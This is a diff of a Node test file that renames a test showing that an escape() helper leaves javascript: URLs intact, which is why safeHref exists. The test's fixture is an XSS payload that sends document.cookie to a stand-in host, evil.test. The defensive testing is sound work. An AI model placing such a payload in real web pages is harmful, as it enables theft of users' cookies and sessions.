@@ -12,7 +12,7 @@ import test from 'node:test';
 import assert from 'node:assert/strict';
 import { escape, safeHref } from './utils.ts';
 
-test('escape() does not neutralise a javascript: URL — this is why safeHref exists', () => {
+test('escape() does not neutralise a javascript: URL - this is why safeHref exists', () => {
   // No quotes, so escape() has nothing to act on - which is exactly how a real
   // payload is written. It survives escaping byte-for-byte and stays executable.
   const payload = 'javascript:fetch(`https://evil.test/${document.cookie}`)';
